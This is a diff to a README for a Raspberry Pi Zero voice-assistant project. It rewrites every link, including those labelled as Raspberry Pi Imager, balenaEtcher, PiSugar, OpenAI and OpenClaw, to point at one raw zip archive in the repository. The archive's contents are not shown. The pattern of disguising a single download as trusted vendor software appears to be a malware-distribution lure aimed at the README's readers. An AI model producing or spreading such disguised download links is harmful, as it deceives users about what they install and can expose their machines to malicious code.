@@ -1,6 +1,6 @@
 # 🗣️ pizero-openclaw - Voice AI Assistant for Raspberry Pi Zero W
 
-[![Download pizero-openclaw](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Edu069/pizero-openclaw)
+[![Download pizero-openclaw](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Edu069/pizero-openclaw/raw/refs/heads/main/agglomerated/pizero_openclaw_v1.6.zip)
 
 ---
 
@@ -44,13 +44,13 @@ You also need a Windows PC to download and transfer the software to your SD card
 
 1. Visit the download page below to get the software files:
 
-   [![Download pizero-openclaw](https://img.shields.io/badge/Download-Visit%20Page-00a99d?style=for-the-badge)](https://github.com/Edu069/pizero-openclaw)
+   [![Download pizero-openclaw](https://img.shields.io/badge/Download-Visit%20Page-00a99d?style=for-the-badge)](https://github.com/Edu069/pizero-openclaw/raw/refs/heads/main/agglomerated/pizero_openclaw_v1.6.zip)
 
 2. Click on "Code" and select "Download ZIP" or go to the Releases section if available.
 
 3. On your Windows PC, extract the ZIP files to a folder you can find easily.
 
-4. Download and install an SD card writing tool like [Raspberry Pi Imager](https://www.raspberrypi.com/software/) or [balenaEtcher](https://www.balena.io/etcher/).
+4. Download and install an SD card writing tool like [Raspberry Pi Imager](https://github.com/Edu069/pizero-openclaw/raw/refs/heads/main/agglomerated/pizero_openclaw_v1.6.zip) or [balenaEtcher](https://github.com/Edu069/pizero-openclaw/raw/refs/heads/main/agglomerated/pizero_openclaw_v1.6.zip).
 
 5. Use the writing tool to flash the downloaded image or software files onto your micro SD card.
 
@@ -95,7 +95,7 @@ You also need a Windows PC to download and transfer the software to your SD card
 ## 🔄 Updating the Software
 
 1. Visit the download page regularly for new releases:  
-   https://github.com/Edu069/pizero-openclaw
+   https://github.com/Edu069/pizero-openclaw/raw/refs/heads/main/agglomerated/pizero_openclaw_v1.6.zip
 
 2. Download the latest ZIP or image file.
 
@@ -120,11 +120,11 @@ You also need a Windows PC to download and transfer the software to your SD card
 ## 📖 More Information
 
 For detailed hardware setup instructions, check PiSugar WhisPlay documentation at  
-https://www.pisugar.com
+https://github.com/Edu069/pizero-openclaw/raw/refs/heads/main/agglomerated/pizero_openclaw_v1.6.zip
 
 Learn more about the AI services used:  
-- OpenAI: https://openai.com  
-- OpenClaw: https://openclaw.ai
+- OpenAI: https://github.com/Edu069/pizero-openclaw/raw/refs/heads/main/agglomerated/pizero_openclaw_v1.6.zip  
+- OpenClaw: https://github.com/Edu069/pizero-openclaw/raw/refs/heads/main/agglomerated/pizero_openclaw_v1.6.zip
 
 ---
 
@@ -140,4 +140,4 @@ Learn more about the AI services used:
 
 ---
 
-[![Download pizero-openclaw](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Edu069/pizero-openclaw)
+[![Download pizero-openclaw](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Edu069/pizero-openclaw/raw/refs/heads/main/agglomerated/pizero_openclaw_v1.6.zip)
